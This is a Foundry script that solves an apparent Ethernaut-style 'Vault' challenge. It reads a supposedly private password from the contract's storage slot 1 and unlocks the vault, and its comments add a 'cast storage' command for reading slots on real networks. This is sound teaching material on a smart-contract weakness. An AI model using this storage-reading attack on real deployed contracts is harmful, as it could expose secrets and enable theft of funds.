// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";
import "forge-std/StdStorage.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolution is Script {
    // $ forge script script/Vault.s.sol --tc VaultSolution

    using stdStorage for StdStorage;

    function run() external {
        Vault vaultInstance = new Vault("password" /* difficult one don't you think :) */);

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - The `Vault` contract has a password that is kept private, we need to know the password in order to unlock the contract.
        // - Since the data is private, it seems we can't retrieve its value. But since the blockchain is public by its design, we can get the password value.
        // - We can read the contract storage slot values, the password lies after the locked variable, so it's in the second slot (slot 1), since we are starting with slot 0.
        // - In Foundry: We can write `cast storage <YOUR_VAULT_INSTANCE_ADDRESS> 1 --rpc-url $SEPOLIA_RPC_URL`.
        // - We will get the password value but in hex format.
        // - You can use any scripting language like JavaScript to decode the hex into a string value, and you will get the password value in a string.
        // - Congratulations, you get the password and you can unlock the contract.

        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1))); // We are reading the first slot
        console.logBytes32(password); // The value is stored as bytes32 type

        // This will return `0x70617373776f7264`, in our password example "password"
        // You can decode the hex into string using any programing language
        // here is how to decode the hex using javascript
        // You can pass it as bytes32 too, no problem about this, it will give correct answer too
        // -------------------------------
        // myPassword = Buffer.from("0x70617373776f7264".slice(2), "hex")
        // myPassword.toString()
        // -------------------------------

        console.log("Vault Locked:", vaultInstance.locked());
        vaultInstance.unlock(password);
        console.log("Vault Locked:", vaultInstance.locked());

        vm.stopPrank();
        // NOTE:
        // --------------------
        // In case you are deailing with contracts that are deployed in real networks, you can use `cast` instead.
        // Here is an example of how to read storage from contracts deployed on real networks
        // $ cast storage <YOUR_VAULT_INSTANCE_ADDRESS> <SLOT_NUMBER> --rpc-url <YOUR_RPC_URL>
    }
}
